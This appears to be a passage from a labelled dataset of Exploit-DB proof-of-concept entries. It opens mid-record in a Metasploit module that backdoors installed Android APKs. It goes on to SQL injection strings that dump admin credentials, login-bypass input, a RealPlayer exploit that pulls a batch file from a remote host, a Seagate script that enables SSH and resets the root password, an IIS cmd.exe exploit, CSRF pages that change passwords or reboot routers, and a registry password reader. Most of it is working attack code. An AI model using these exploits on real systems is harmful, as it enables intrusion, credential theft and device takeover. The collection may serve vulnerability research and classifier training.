ro.build.version.release"")     unless Gem::Version.new(os).between?(Gem::Version.new('5.1.1'), Gem::Version.new('8.0.0'))       vprint_error ""Android version #{os} is not vulnerable.""       return CheckCode::Safe     end     vprint_good ""Android version #{os} appears to be vulnerable.""      patch = cmd_exec('getprop ro.build.version.security_patch')     if patch.empty?       print_status 'Unable to determine patch level.  Pre-5.0 this is unaccessible.'     elsif patch > '2017-12-05'       vprint_error ""Android security patch level #{patch} is patched.""       return CheckCode::Safe     else       vprint_good ""Android security patch level #{patch} is vulnerable""     end      CheckCode::Appears   end    def exploit      def infect(apkfile)       unless apkfile.start_with?(""package:"")         fail_with Failure::BadConfig, 'Unable to locate app apk'       end       apkfile = apkfile[8..-1]       print_status ""Downloading APK: #{apkfile}""       apk_data = read_file(apkfile)        begin         # Create an apk with the payload injected         apk_backdoor = ::Msf::Payload::Apk.new         apk_zip = apk_backdoor.backdoor_apk(nil, payload.encoded, false, false, apk_data, false)          # Extract the classes.dex         dex_data = ''         Zip::File.open_buffer(apk_zip) do |zipfile|           dex_data = zipfile.read(""classes.dex"")         end         dex_size = dex_data.length          # Fix the original APKs zip file code directory         cd_end_addr = apk_data.rindex(""\x50\x4b\x05\x06"")         cd_start_addr = apk_data[cd_end_addr+16, cd_end_addr+20].unpack(""V"")[0]         apk_data[cd_end_addr+16...cd_end_addr+20] = [ cd_start_addr+dex_size ].pack(""V"")         pos = cd_start_addr         while pos && pos < cd_end_addr           offset = apk_data[pos+42, pos+46].unpack(""V"")[0]           apk_data[pos+42...pos+46] = [ offset+dex_size ].pack(""V"")           pos = apk_data.index(""\x50\x4b\x01\x02"", pos+46)         end          # Prepend the new classes.dex to the apk         out_data = dex_data + apk_data         out_data[32...36] = [ out_data.length ].pack(""V"")         out_data = fix_dex_header(out_data)          out_apk = ""/sdcard/#{Rex::Text.rand_text_alphanumeric 6}.apk""         print_status ""Uploading APK: #{out_apk}""         write_file(out_apk, out_data)         register_file_for_cleanup(out_apk)         print_status ""APK uploaded""          # Prompt the user to update the APK         session.appapi.app_install(out_apk)         print_status ""User should now have a prompt to install an updated version of the app""         true       rescue => e         print_error e.to_s         false       end     end      unless [CheckCode::Detected, CheckCode::Appears].include? check       unless datastore['ForceExploit']         fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'       end       print_warning 'Target does not appear to be vulnerable'     end      if datastore[""PACKAGE""] == 'ALL'       vprint_status('Finding installed packages (this can take a few minutes depending on list of installed packages)')       apkfiles = []       all = cmd_exec(""pm list packages"").split(""\n"")       c = 1       all.each do |package|         package = package.split(':')[1]         vprint_status(""Attempting exploit of apk #{c}/#{all.length} for #{package}"")         c += 1         next if ['com.metasploit.stage', # avoid injecting into ourself                 ].include? package # This was left on purpose to be expanded as need be for testing         result = infect(cmd_exec(""pm path #{package}""))         break if result       end     else       infect(cmd_exec(""pm path #{datastore[""PACKAGE""]}""))     end   end end",Signature Bypass,1
26055,"Ragnarok Online Control Panel 4.3.4 a - Authentication Bypass source: https://www.securityfocus.com/bid/14429/info  Ragnarok Online Control Panel (ROCP) is prone to a vulnerability that may let remote attackers bypass user authentication. This issue is related to how PHP variables are handled, letting an attacker influence a variable that is used to check user authentication.  Exploitation could yield administrative access to the ROCP site.  This issue may be exclusive to sites hosting ROCP with Apache Web server. This has not been confirmed.   http://www.example.com/CP/account_manage.php/login.php",Authentication Bypass,1
6517,"Netartmedia Jobs Portal 1.3 - Multiple SQL Injections ######## ##    ##  ######  ########  ##    ## ########  ########  #######  ######## ##       ###   ## ##    ## ##     ##  ##  ##  ##     ##    ##    ##     ## ##     ## ##       ####  ## ##       ##     ##   ####   ##     ##    ##           ## ##     ## ######   ## ## ## ##       ########     ##    ########     ##     #######  ##     ## ##       ##  #### ##       ##   ##      ##    ##           ##           ## ##     ## ##       ##   ### ##    ## ##    ##     ##    ##           ##    ##     ## ##     ## ######## ##    ##  ######  ##     ##    ##    ##           ##     #######  ######## ################################ !R4Q!4N H4CK3R  ################################### NetArtMedia Jobs Portal 1.3  Multiple Sql Injection Vulnerabilities Website    : http://www.netartmedia.net Founded By : Encrypt3d.M!nd Home Page  : http://encrypt3d.blogspot.com  # Remote Sql Injection(s) : Affected File(s) : index.php   PoC: /index.php?mod=search&job=-666 union select 1,2,3,4,5,username,password,8,9,10,11,12,13,14 from websiteadmin_admin_users /index.php?page_id=-1&news_id=-666 union select 1,2,username,password,5,6 from websiteadmin_admin_users Administration Panel: /ADMIN/login.php  # Greetz: MY Sweet,L!0N,EL Mariachi,-=MizO=-,Shadow Administrator, KoRn The Dog,MiNi-SpIder,All My Friends  The EnD :D  # milw0rm.com [2008-09-21]",SQL Injections,1
48475,"WordPress Plugin Ajax Load More 5.3.1 - '#1' Authenticated SQL Injection # Exploit Title: Wordpress Plugin Ajax Load More 5.3.1 - '#1' Authenticated SQL Injection # Exploit Author: SunCSR (Sun* Cyber Security Research) - Nguyen Khang # Google Dork: N/A # Date: 2020-05-18 # Vendor Homepage: https://connekthq.com/plugins/ajax-load-more/ # Software Link: https://vi.wordpress.org/plugins/ajax-load-more/ # Version: <= 5.3.1 # Tested on: Ubuntu 18.04  Description: A blind SQL injection vulnerability is present in Ajax load more. $wpdb->get_var(""SELECT repeaterDefault FROM "" . $table_name . "" WHERE name = '$n'"");  POC:  POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1 Host: lab-pwn.com User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://lab-pwn.com/wordpress/wp-admin/admin.php?page=ajax-load-more-repeaters Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 597 Origin: http://lab-pwn.com Connection: close Cookie: wordpress_ce916d86f593e303743adeb31ce28da7=admin%7C1589950799%7CCMYSDjadMRtkKIav5orz6knKlOvE7Bz8d67ACwFl5fl%7Cab29a771b72eed2d65f02d50fd24ea85ae85f38d0fcc41abb56797fb8c7590a3; wordpress_logged_in_ce916d86f593e303743adeb31ce28da7=admin%7C1589950799%7CCMYSDjadMRtkKIav5orz6knKlOvE7Bz8d67ACwFl5fl%7Cb14c3363c0174d9eb93e2d2bbdd3627b293ea3e8fa8a1080325f62bb462938e2; wp-settings-time-1=1589773793; PHPSESSID=0lsvlo9il6ibjiuflljl3qcub1  action=alm_update_repeater&value=%3Cli+%3C%3Fphp+if+(!has_post_thumbnail())+%7B+%3F%3E+class%3D%22no-img%22%3C%3Fphp+%7D+%3F%3E%3E%0A+++%3C%3Fphp+if+(+has_post_thumbnail()+)+%7B+the_post_thumbnail('alm-thumbnail')%3B+%7D%3F%3E%0A+++%3Ch3%3E%3Ca+href%3D%22%3C%3Fphp+the_permalink()%3B+%3F%3E%22+title%3D%22%3C%3Fphp+the_title()%3B+%3F%3E%22%3E%3C%3Fphp+the_title()%3B+%3F%3E%3C%2Fa%3E%3C%2Fh3%3E%0A+++%3Cp+class%3D%22entry-meta%22%3E%3C%3Fphp+the_time(%22F+d%2C+Y%22)%3B+%3F%3E%3C%2Fp%3E%0A+++%3C%3Fphp+the_excerpt()%3B+%3F%3E%0A%3C%2Fli%3E&repeater=' or sleep(5)#&type=test&alias=&nonce=ae68ab8c91  SQL map: custom injection marker ('*') found in option '--data'. Do you want to process it? [Y/n/q] [12:43:16] [INFO] resuming back-end DBMS 'mysql' [12:43:16] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: #1* ((custom) POST)     Type: boolean-based blind     Title: OR boolean-based blind - WHERE or HAVING clause     Payload: action=alm_update_repeater&value=<li <?php if (!has_post_thumbnail()) { ?> class=""no-img""<?php } ?>>    <?php if ( has_post_thumbnail() ) { the_post_thumbnail('alm-thumbnail'); }?>    <h3><a href=""<?php the_permalink(); ?>"" title=""<?php the_title(); ?>""><?php the_title(); ?></a></h3>    <p class=""entry-meta""><?php the_time(""F d, Y""); ?></p>    <?php the_excerpt(); ?> </li>&repeater=-2104' OR 5557=5557-- dHBa#&type=test&alias=&nonce=ae68ab8c91      Type: error-based     Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)     Payload: action=alm_update_repeater&value=<li <?php if (!has_post_thumbnail()) { ?> class=""no-img""<?php } ?>>    <?php if ( has_post_thumbnail() ) { the_post_thumbnail('alm-thumbnail'); }?>    <h3><a href=""<?php the_permalink(); ?>"" title=""<?php the_title(); ?>""><?php the_title(); ?></a></h3>    <p class=""entry-meta""><?php the_time(""F d, Y""); ?></p>    <?php the_excerpt(); ?> </li>&repeater=' OR (SELECT 3214 FROM(SELECT COUNT(*),CONCAT(0x716a6b7a71,(SELECT (ELT(3214=3214,1))),0x716a716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- AHqK#&type=test&alias=&nonce=ae68ab8c91      Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 OR time-based blind     Payload: action=alm_update_repeater&value=<li <?php if (!has_post_thumbnail()) { ?> class=""no-img""<?php } ?>>    <?php if ( has_post_thumbnail() ) { the_post_thumbnail('alm-thumbnail'); }?>    <h3><a href=""<?php the_permalink(); ?>"" title=""<?php the_title(); ?>""><?php the_title(); ?></a></h3>    <p class=""entry-meta""><?php the_time(""F d, Y""); ?></p>    <?php the_excerpt(); ?> </li>&repeater=' OR SLEEP(5)-- pExJ#&type=test&alias=&nonce=ae68ab8c91 --- [12:43:17] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: Nginx back-end DBMS: MySQL >= 5.0",Authenticated SQL Injection,1
7551,"Calendar Script 1.1 - Authentication Bypass  -----------------------------------------------------  Calendar Script v1.1 Admin Login Bypass Vulnerability  -----------------------------------------------------  by athos - staker[at]hotmail[dot]it  http://www.hotscripts.com/jump.php?listing_id=71365&jump_type=1   File Vuln ""index.php"" (code details)   ------------------------------------------------------------   4.  $action = $_POST['action'];  5.  6.  switch($action) {  7.  case 'login':  8.  // login  9.  $username = stripslashes(trim($_POST['username']));  10. $password = sha1(stripslashes(trim($_POST['password'])));  11.  12. if(empty($username) || empty($password)) {  13. // Stop, someone tried entering nothing into here  14. // Show an error.  15. $loginMsg = 'You must enter a username and password';  16. } else {  17. // The input seems to be ok, check it against the database.  18. $checkDetails = mysql_query(""SELECT id FROM user WHERE username='$username' AND password='$password' LIMIT 1"", $conn);   ------------------------------------------------------------   Exploit   http://[host]/[path]/index.php   (Login) Username: ' or 1=1# & Password: anything   ------------------------------------------------------------   Fix: $username = mysql_real_escape_string($_POST['username']);   Note: works regardless php.ini settings (str0ke =D)        don't add me on msn messenger   ------------------------------------------------------------  # milw0rm.com [2008-12-22]",Authentication Bypass,1
44402,"Microsoft Windows Defender - 'mpengine.dll' Memory Corruption Windows Defender inspects a variety of different archive formats, among others RAR.  Inspection of mpengine.dll revealed that the code responsible for processing RAR archives appears to be a forked and modified version of the original unrar code; given that it still processes the VMSF_UPCASE filter (which was removed in unrar 5.0), it seems that the code is derived from a version of unrar older or equal than 4.2.4.  Interestingly, the issue discovered in CVE-2012-6706 (Sophos VMSF_DELTA, and in 2017 unrar) and other signedness issues in the RarVM::ExecuteStandardFilter function were fixed long ago (apparently without a report to upstream, most likely by simply turning the relevant variables from ""signed"" to ""unsigned"").  It appears that this blanket conversion from signed to unsigned ended up introducing a new vulnerability, though:  From unrar 4.2.4 rarvm.cpp:      case VMSF_RGB:       {         int DataSize=R[4],Width=R[0]-3,PosR=R[1];         byte *SrcData=Mem,*DestData=SrcData+DataSize;         const int Channels=3;         SET_VALUE(false,&Mem[VM_GLOBALMEMADDR+0x20],DataSize);         if ((uint)DataSize>=VM_GLOBALMEMADDR/2 || PosR<0)           break;         for (int CurChannel=0;CurChannel<Channels;CurChannel++)  The code clearly ensures that PosR is positive from here on.  This check is no longer present in the binary version of the same code in mpengine, most likely since most signed comparisons in this function have been turned unsigned.   This causes a vulnerability later in the same function (RarVM::ExecuteStandardFilter)  Decompile of the mpengine code snippet:  if ( PosR + 2 < DataSize ) {   v50 = (_BYTE *)(v39 + PosR);   do {     v51 = v50[1];     *v50 += v51;     v50 += 3;     *(v50 - 1) += v51;   } while ( (unsigned int)&v50[2 - v39] < DataSize );  Original unrar code:   for (int I=PosR,Border=DataSize-2;I<Border;I+=3)   {     byte G=DestData[I+1];     DestData[I]+=G;     DestData[I+2]+=G;   }  An attacker that can set PosR to be -2, and DataSize to 1, will bypass the (PosR + 2 < DataSize) check. v50 above will then point to one byte *before* the allocated buffer (v50 respective DestData points into a buffer at index DataSize -- so adding -2 to index 1 will index to -1. The byte from the start of this array will be added into the byte preceding the array.  A minimal sample RAR file that exhibits these traits & causes mpengine to corrupt memory and crash is attached.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/44402.zip",Memory Corruption,1
38231,"Scripts Genie Classified Ultra - SQL Injection / Cross-Site Scripting source: https://www.securityfocus.com/bid/57465/info  Classified Ultra is prone to an SQL-injection vulnerability and a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   SQL-injection:  http://www.example.com/demos/classifiedultra/subclass.php?c=16'[SQLi HERE]  Cross-site scripting:  http://www.example.com/demos/classifiedultra/subclass.php?c=6&cname=Credit%20Cards[XSS HERE]",Cross-Site Scripting,1
15991,"Real Networks RealPlayer SP - 'RecordClip' Method Remote Code Execution Sources:  https://www.securityfocus.com/bid/44443/info           http://packetstormsecurity.org/files/view/97522/recordingmanager-ie.txt <html>  <p> Written by Sean de Regge (seanderegge hotmail.com)  Exploit for the parameter injection bug in Realplayers RecordClip() activeX function and firefox plugin http://www.zerodayinitiative.com/advisories/ZDI-10-211/  C:\Program Files\Real\RealPlayer\RecordingManager.exe has 2 interesting switches: /t will spoof the download of any file so you can make it look like it's downloading a normal mp3 file /f will make it download to any location on the disk instead of the realplayer downloads folder  Restrictions: The extension on server side must be a valid media file (ie: .mp3) Realplayer does some checks on the file to see if it is a valid media file too, so we need to create a  chimera file, which will parse as a valid mp3 file and a valid batch file. Best is to take a valid mp3 file and modify it in a hex editor to have your batch commands in the first couple of bytes. </p>  <OBJECT ID=""obj"" WIDTH=0 HEIGHT=0 CLASSID=""CLSID:FDC7A535-4070-4B92-A0EA-D9994BCC0DC5""> </OBJECT> <embed type=""audio/x-pn-realaudio-plugin""       controls=""ImageWindow""     console=""video1""     src='http://xx.xx.xx.xx/batch_file_in_mp3.mp3"" /f C:\\malicious.bat /t cool_song.mp3'     width=""240""     height=""180""     autostart=true>   </embed>  <script>   var file = 'http://xx.xx.xx.xx/batch_file_in_mp3.mp3"" /f C:\\malicious.bat /t cool_song.mp3';  obj.RecordClip(file, ""audio/mpeg3"", ""clipInfo""); 	  </script> </html>",Method Remote Code Execution,1
43659,"Seagate Personal Cloud - Multiple Vulnerabilities # SSD Advisory – Seagate Personal Cloud Multiple Vulnerabilities  ## Vulnerabilities summary The following advisory describes two (2) unauthenticated command injection vulnerabilities.  Seagate Personal Cloud Home Media Storage is “the easiest way to store, organize, stream and share all your music, movies, photos, and important documents.”  ## Credit An independent security researcher, Yorick Koster, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program  ## Vendor response Seagate was informed of the vulnerability on October 16, but while acknowledging the receipt of the vulnerability information, refused to respond to the technical claims, to give a fix timeline or coordinate an advisory  ## Vulnerabilities details Seagate Media Server uses Django web framework and is mapped to the .psp extension.  Any URL that ends with .psp is automatically send to the Seagate Media Server application using the FastCGI protocol. /etc/lighttpd/conf.d/django-host.conf:   ``` fastcgi.server += ( "".psp""=>    ((       ""socket"" => ""/var/run/manage_py-fastcgi.socket"",       ""check-local"" => ""disable"",       ""stream-post"" => ""enable"",       ""allow-x-send-file"" => ""enable"",    )), "".psp/""=>    ((       ""socket"" => ""/var/run/manage_py-fastcgi.socket"",       ""check-local"" => ""disable"",       ""stream-post"" => ""enable"",       ""allow-x-send-file"" => ""enable"",    )) ) ```   URLs are mapped to specific views in the file /usr/lib/django_host/seagate_media_server/urls.py.  Two views were found to be affected by unauthenticated command injection.  The affected views are:  - uploadTelemetry - getLogs  These views takes user input from GET parameters and pass these unvalidated/unsanitized to methods of the commands Python module.  This allows an attacker to inject arbitrary system commands, that will be executed with root privileges.  /usr/lib/django_host/seagate_media_server/views.py:   ``` @csrf_exempt def uploadTelemetry(request):    ts = request.GET.get('TimeStamp','')    if (checkDBSQLite()) :       response = '{""stat"":""failed"",""code"":""80"",""message"":""The Database has not been initialized or mounted yet!""}'    else :       if ts == """":          response = '{""stat"":""failed"",""code"":""380"",""message"":""TimeStamp parameter missing""}'          return HttpResponse(response);       cmd = ""/usr/local/bin/log_telemetry ""+str(ts)       commands.getoutput(cmd)    return HttpResponse('{""stat"":""ok""}') ```   /usr/lib/django_host/seagate_media_server/views.py:   ``` @csrf_exempt def getLogs (request):    try:       cmd_base='/usr/bin/log-extract-manager.sh'       uID = request.GET.get ( 'arch_id', None )       time_stamp = request.GET.get ( 'time_stamp', '' )           if uID:          (status, output) = commands.getstatusoutput(cmd_base + ' status ' + uID);          if ('In progress' in output) and (uID in output) :             return HttpResponse ('{""stat"":""ok"", ""data"": {""status"":""In Progress""}}')          elif (status == 0) :             return HttpResponse ('{""stat"":""ok"", ""data"": {""url"":""%s"", ""fileSize"":""%d""}}' % ( urllib.quote(output.encode('utf-8')), os.path.getsize(output) ))          else :             return HttpResponse ('{""stat"":""failed"", ""code"":""853"",""message"":""Id not recognized.""}' )       else:          (status, output) = commands.getstatusoutput(cmd_base + ' start ' + time_stamp);          if (status == 0) :             return HttpResponse ('{""stat"":""ok"", ""data"": {""archiveID"":""%s""}}' % (output))           return HttpResponse ('{""stat"":""failed"", ""code"":""852"",""message"":""Zip file not created.""}' )    except :       return HttpResponse ('{""stat"":""failed"", ""code"":""852"",""message"":""Zip file not created.""}' ) ```   Note that both views contain the csrf_exempt decorator, which disables the default Cross-Site Request Forgery protection of Django. As such, these issues can be exploited via Cross-Site Request Forgery.  ### Proof of Concept The following proof of concept will try to enable the SSH service, and change the root password. When successful it will be possible to log into the device over SSH with the new password.   ``` #!/usr/bin/env python import os import urllib     scheme = 'http' host = 'personalcloud.local' port = '80' path = 'uploadTelemetry.psp' querystr = 'TimeStamp=%3b' #path = 'getLogs.psp' #querystr = 'time_stamp=%3b' password = 'Welcome01'     cmds = ['ngc --start sshd 2>&1',       'echo -e ""%(s)s\n%(s)s""|passwd 2>&1' % {'s' : password}]     for cmd in cmds:    print 'Running command', repr(cmd)    cmd = urllib.quote_plus(cmd)    r = urllib.urlopen('%s://%s:%s/%s?%s%s' % (scheme, host, port, path, querystr, cmd))    print r.read()     print 'Log in with', password os.system('ssh -p 2222 root@%s' % host) ```",unauthenticated command injection,1
848,"Einstein 1.01 - Local Password Disclosure (ASM) ; Nothing Special other than the program doesnt encode the user/pass in the registry. ; Einstein v1.01 - http://www.Bfriendly.com some crappy file school sharing program ; made because i think C is overkill for these types of local exploits, ; shit we can does this in vbs/bat too if ya want ;Compiles in Masm ;c:\Masm32\BIN\ml.exe /c /coff /Cp einstein.asm ;c:\Masm32\BIN\Link.exe /SUBSYSTEM:CONSOLE /LIBPATH:c:\MASM32\lib einstein.obj  .386 .model flat, stdcall option casemap :none include \masm32\include\windows.inc include \masm32\include\user32.inc include \masm32\include\kernel32.inc include \masm32\include\shell32.inc include \masm32\include\advapi32.inc include \masm32\include\masm32.inc includelib \masm32\lib\user32.lib includelib \masm32\lib\kernel32.lib includelib \masm32\lib\shell32.lib includelib \masm32\lib\advapi32.lib includelib \masm32\lib\masm32.lib      literal MACRO quoted_text:VARARG        LOCAL local_text        .data          local_text db quoted_text,0        .code        EXITM <local_text>      ENDM      SADD MACRO quoted_text:VARARG        EXITM <ADDR literal(quoted_text)>      ENDM .data    SubKey            db ""Software\\einstein"",0    szUser            db ""username"",0    szPass            db ""password"",0    noExeem           db ""Einstein v1.01 is not installed on your pc!"",0    Theoutput  db   '_______________________________________________________________',13,10               db   '*               Einstein v1.01 Local  Pass Exploit            *',13,10               db   '*                    Based On Kozans code in C                *',13,10               db   '*                by illwill  - xillwillx@yahoo.com            *',13,10               db   '*_____________________________________________________________*',13,10               db   '                      UserName: %s                             ',13,10               db   '                      Password: %s                             ',13,10,0    KeySize    DWORD 255 .data?     TheIPData           db 64 dup (?)     TheUSERData         db 64 dup (?)     ThePASSData         db 64 dup (?)     TheReturn           DWORD ?     strbuf              db 258 dup (?)  .code start:     invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE,addr SubKey,0,KEY_READ,addr TheReturn      .IF eax==ERROR_SUCCESS         invoke RegQueryValueEx,TheReturn,addr szUser,0,0,addr TheUSERData, addr KeySize                         .IF KeySize < 2                              invoke lstrcpy,addr TheUSERData,SADD(""NOT FOUND"")                         .ENDIF         invoke RegQueryValueEx,TheReturn,addr szPass,0,0,addr ThePASSData, addr KeySize                          .IF KeySize < 2                              invoke lstrcpy,addr ThePASSData,SADD(""NOT FOUND"")                         .ENDIF         invoke wsprintf, addr strbuf, addr Theoutput,addr TheIPData,addr TheUSERData,addr ThePASSData         invoke StdOut, addr strbuf      .ELSE           invoke StdOut, addr noExeem        .ENDIF     invoke RegCloseKey , TheReturn    Invoke ExitProcess,0 end start  ; milw0rm.com [2005-02-28]",Local Password Disclosure,1
24921,"OpenCart - Cross-Site Request Forgery (Change User Password) # Exploit Title		: OpenCart CSRF # Date		    	: 2013/4/2 # Exploit Author	: Saadat Ullah ， saadi_linux@rocketmail.com # Software Link 	: http://www.opencart.com/index.php?route=download/download 					: https://github.com/opencart # Software web  	: www.opencart.com # Author HomePage	: http://security-geeks.blogspot.com/ # Tested on: Server : Apache/2.2.15 PHP/5.3.3  # Cross-site request forgery  OpenCart is an open source shoping cart system , suffers from Cross-site request forgery through which attacker can manipulate user data via sending him malicious craft url.  OpenCart is not using any security token to prevent it against CSRF. It is vulnerable to all location inside User panel.  Header  ---------------------------------------------------------- http://localhost/index.php?route=account/password  POST /index.php?route=account/password HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=e634322aa558022cdd8664b8d32124b7; language=en; currency=USD Connection: keep-alive Content-Type: multipart/form-data; boundary=---------------------------2465524120551 Content-Length: 257 -----------------------------2465524120551 Content-Disposition: form-data; name=""password""  123456789 -----------------------------2465524120551 Content-Disposition: form-data; name=""confirm""  123456789 -----------------------------2465524120551--  Response  HTTP/1.1 302 Found Date: Tue, 02 Apr 2013 14:49:53 GMT Server: Apache Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Status: 302 Location: http://localhost/index.php?route=account/account Content-Length: 0 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html ----------------------------------------------------------  Simple Poc to change user Password  <form action=""http://localhost/index.php?route=account/password"" method=""post"" enctype=""multipart/form-data"">       <div class=""content"">       <table class=""form"">         <tbody><tr>                    <td><input name=""password"" value=""987654321"" type=""hidden"">             </td>         </tr>         <tr>                     <td><input name=""confirm"" value=""987654321"" type=""hidden"">             </td>         </tr>       </tbody></table>     </div>     <div class=""buttons"">            <div class=""right""><input value=""Continue"" class=""button"" type=""submit""></div>     </div>   </form>  #Independent Pakistani Security Researcher",Cross-Site Request Forgery,1
19003,"vanilla kpoll plugin 1.2 - Persistent Cross-Site Scripting # Title: Vanilla kPoll 1.2 Stored XSS # Date: 5/6/12 # Author: Henry Hoggard # Author URL: henryhoggard.co.uk # Author Twitter: @henryhoggard # Software: Vanilla Version 2.0.18.4 + Vanilla kPoll 1.2 # http://vanillaforums.org/download # http://vanillaforums.org/addon/kpoll-plugin  To Create the XSS go to this link,  http://vanilla.tld/index.php?p=/plugin/kPoll  Post your XSS as the poll title.  The XSS I used is <script>alert('xss')</script>  #############################################################",Persistent Cross-Site Scripting,1
20836,"Microsoft IIS 3.0/4.0/5.0 - PWS Escaped Characters Decoding Command Execution (2) // source: https://www.securityfocus.com/bid/2708/info   Due to a flaw in the handling of CGI filename program requests, remote users can execute arbitrary commands on an IIS host.   When IIS receives a CGI filename request, it automatically performs two actions before completing the request:   1. IIS decodes the filename to determine the filetype and the legitimacy of the file. IIS then carries out a security check.   2. When the security check is completed, IIS decodes CGI parameters.   A flaw in IIS involves a third undocumented action: Typically, IIS decodes only the CGI parameter at this point, yet the previously decoded CGI filename is mistakenly decoded twice. If a malformed filename is submitted and circumvents the initial security check, the undocumented procedure will decode the malformed request, possibly allowing the execution of arbitrary commands.   Note that arbitrary commands will be run with the IUSR_machinename account privileges. Reportedly, various encoding combinations under Windows 2000 Server and Professional may yield different outcomes.   Personal Web Server 1.0 and 3.0 are reported vulnerable to this issue.   The worm Nimda(and variants) actively exploit this vulnerability.   /*  IISEX by HuXfLuX <huxflux2001@hotmail.com>. IIS CGI File Decode Bug exploit. Written 16-05-2001.     Compiles on Linux, works with IIS versions 3, 4 and 5. Microsoft's products were always     famous for their backward compatibility!      You can change the SHOWSEQUENCE value to some other strings that also work.     More info: http://www.nsfocus.com      Thanx to Filip Maertens <filip@securax.be> */  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdarg.h> #include <unistd.h> #include <errno.h> #include <sys/socket.h> #include <sys/time.h> #include <netinet/in.h> #include <netdb.h> #include <arpa/inet.h>  #define SHOWSEQUENCE ""/scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+""  int resolv(char *hostname,struct in_addr *addr);  int main(int argc, char *argv[]) {          struct sockaddr_in sin;         struct in_addr victim;         char recvbuffer[1], stuff[200]="""";         int create_socket;          printf(""IISEX by HuxFlux <huxflux2001@hotmail.com>\nThis exploits the IIS CGI Filename Decode Error.\nWorks with IIS versions 3, 4 and 5!.\n"");          if (argc < 3)         {                 printf(""[?] Usage: %s [ip] [command]\n"", argv[0]);                 exit(0);         }          if (!resolv(argv[1],&victim))         {                 printf(""[x] Error resolving host.\n"");                 exit(-1);         }         printf(""\n[S] Exploit procedure beginning.\n"");          if (( create_socket = socket(AF_INET,SOCK_STREAM,0)) > 0 ) printf(""[*] Socket created.\n"");          bzero(&sin,sizeof(sin));         memcpy(&sin.sin_addr,&victim,sizeof(struct in_addr));         sin.sin_family = AF_INET;         sin.sin_port = htons(80);         //sin.sin_addr.s_addr = inet_addr(argv[1]);           if (connect(create_socket, (struct sockaddr *)&sin,sizeof(sin))==0) printf(""[*] Connection made.\n"");         else {                 printf(""[x] No connection.\n"");                 exit(1);         }          strcat(stuff, ""GET "");         strcat(stuff, SHOWSEQUENCE);         strcat(stuff, argv[2]);         strcat(stuff, "" HTTP/1.0\r\n\r\n"");         printf(""[*] Sending: %s"", stuff);          memset(recvbuffer, '\0',sizeof(recvbuffer));          send(create_socket, stuff, sizeof(stuff), 0);          if ( strstr(recvbuffer,""404"") == NULL ) {                 printf(""[*] Command output:\n\n"");                  while(recv(create_socket, recvbuffer, 1, 0) > 0)                 {                         printf(""%c"", recvbuffer[0]);                 }                 printf(""\n\n"");         }         else printf(""[x] Wrong command processing. \n"");         printf(""[E] Finished.\n"");          close(create_socket); }  int resolv(char *hostname,struct in_addr *addr) {         struct hostent *res;          if (inet_aton(hostname,addr)) return(1);          res = gethostbyname(hostname);         if (res == NULL) return(0);          memcpy((char *)addr,(char *)res->h_addr,sizeof(struct in_addr));         return(1); }",Escaped Characters Decoding Command Execution,1
45078,"Tenda Wireless N150 Router 5.07.50 - Cross-Site Request Forgery (Reboot Router) # Exploit Title: Tenda Wireless N150 Router 5.07.50 - Cross-Site Request Forgery (Reboot Router) # Date: 2018-07-21 # Exploit Author: Nathu Nandwani # Website: http://nandtech.co # CVE: CVE-2015-5996 # # Description: # # The router is vulnerable to a cross-site request forgery attacker.  # If an administrator is currently logged in and visits a  # remote webpage containing forms existing in the router's firmware,  # a request can be forged to modify existing settings or even  # set the router to its default state. # # These are two examples that can work in the proof of concept:  # /goform/SysToolReboot - Reboot the router # /goform/SysToolRestoreSet - Set the router to default settings # # Reference: https://www.kb.cert.org/vuls/id/630872  import socket  server_ip = ""0.0.0.0"" server_port = 80  router_ip = ""192.168.0.1""  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.bind((server_ip, server_port)) sock.listen(1)  print ""Currently listening at "" + server_ip + "":"" + str(server_port)          client, (client_host, client_port) = sock.accept()  print ""Client connected: "" + client_host + "":"" + str(client_port) print """" print client.recv(1000)  client.send('HTTP/1.0 200 OK\r\n') client.send('Content-Type: text/html\r\n') client.send('\r\n') client.send("""""" <html>     <body>         <form method=""post"" id=""frmSetup"" name=""frmSetup"" action=""http://"""""" + router_ip + """"""/goform/SysToolReboot"">             <input name=""CMD"" value=""SYS_CONF"" type=""hidden"">             <input name=""GO"" value=""system_reboot.asp"" type=""hidden"">             <input name=""CCMD"" value=""0"" type=""hidden"">         </form>         <script>             document.getElementById(""frmSetup"").submit();         </script>     </body> </html> """""")  client.close() sock.close()",Cross-Site Request Forgery,1
